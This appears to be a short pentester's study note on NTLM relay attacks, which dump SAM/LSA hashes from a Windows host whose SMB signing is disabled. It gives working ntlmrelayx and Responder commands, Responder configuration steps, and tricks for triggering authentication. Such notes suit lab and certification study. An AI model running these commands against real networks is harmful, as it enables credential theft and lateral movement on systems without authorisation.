this is used to Dump SAM/LSA (LSASS) hashes , the relayed machine **should have SMB Signing disable**

How does it work?
1-The hacker sets up a fake SMB server on their device.
2-The victim's device attempts to connect to this server (for example, requesting a file or share that doesn't exist).
3-The victim sends the login credentials (NTLM authentication).
4-Instead of storing the hash, the hacker immediately sends it to another device (target) using the same credentials and dump there SAM.
5-If this user has privileges on the other device, login is successful. 

-------------


> [!NOTE] Note
> The user has to be domain or local admin on the relayed machine or else we will get `DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied`



```bash
# in this scenario we are relaying form DC01$ to WS01$ that has smb sigining disable.

sudo ntlmrelayx.py -t 10.10.111.12  -smb2support 2>/dev/null

-t -> target to be relayed to. # WS01 in this case
```

```bash
# first: sudo vi /etc/responder/Responder.conf
# Edit Responder settings: SMB = Off and HTTP = Off

sudo responder -I vmnet2 -dwv
```

then we need to wait for someone to access a share that is not valid or trigger with:
- `\\fafa`  in explorer
- `START \\asda` in cmd

> [!NOTE] NOTE!
> *the output hashes are NTLM challenge-response hashes that are not suitable for relaying, it only meant to be cracked.*
